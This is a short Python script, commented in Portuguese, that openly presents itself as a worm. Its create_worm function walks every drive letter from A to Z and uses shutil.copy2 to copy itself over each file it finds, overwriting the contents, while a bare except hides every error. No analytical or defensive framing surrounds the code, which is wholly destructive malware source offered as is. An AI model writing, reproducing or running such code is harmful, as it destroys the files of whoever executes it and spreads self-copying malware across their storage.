import os
import shutil

def create_worm():
    # obtem o nome do arquivo de worm
    worm_name = os.path.basename(__file__)

    # obtem o diretorio de trabalho atual
    worm_dir = os.getcwd()

    # procura por todos os drives disponíveis
    for drive in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
        try:
            # tenta mudar para o drive
            os.chdir(drive + ':\\')

            # obtem o diretorio raiz do drive
            root_dir = os.getcwd()

            # procura por diretorios
            for dir_name, subdirs, files in os.walk(root_dir):
                # procura por arquivos
                for file_name in files:
                    # verifica se o arquivo tem o mesmo nome do worm
                    if file_name == worm_name:
                        # ignora o proprio arquivo de worm
                        continue

                    # constroi o caminho completo do arquivo
                    file_path = os.path.join(dir_name, file_name)

                    # tenta copiar o worm para o arquivo
                    shutil.copy2(worm_name, file_path)
        except:
            # ignora erros
            pass

    # volta para o diretorio de trabalho original
    os.chdir(worm_dir)

if __name__ == '__main__':
    create_worm()
